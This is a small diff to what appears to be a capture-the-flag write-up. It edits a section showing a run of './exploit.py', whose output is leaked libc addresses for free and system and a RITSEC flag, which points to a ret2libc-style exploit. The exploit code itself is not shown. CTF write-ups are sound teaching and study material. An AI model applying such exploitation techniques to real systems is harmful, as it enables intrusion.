@@ -306,9 +306,8 @@ with context.quiet:
 
 ```
 
-### Flag
 ```
-./exploit.py
+$ ./exploit.py
 free@LIBC: 0xf7ddf750
 system@LIBC: 0xf7da9940
 RITSEC{g0_1s_N0T_4lw4y5_7he_w4y_2_g0}
